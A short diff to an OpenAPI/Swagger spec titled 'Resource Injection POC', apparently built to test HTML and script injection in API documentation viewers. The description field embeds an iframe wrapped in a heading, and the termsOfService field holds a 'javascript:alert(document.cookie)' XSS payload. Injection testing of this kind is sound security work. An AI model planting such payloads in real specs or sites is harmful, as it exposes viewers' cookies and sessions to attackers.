@@ -6,7 +6,7 @@ securityDefinitions:
 info:
   version: "0.0.1"
   title: Resource Injection POC
-  description: <iframe width="560" height="315" src="https://www.youtube.com/embed/p5L_s_5zpsQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+  description: <h1><iframe width="560" height="315" src="https://www.youtube.com/embed/p5L_s_5zpsQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></h1>
   termsOfService: "javascript:alert(document.cookie)"
 paths:
   /:
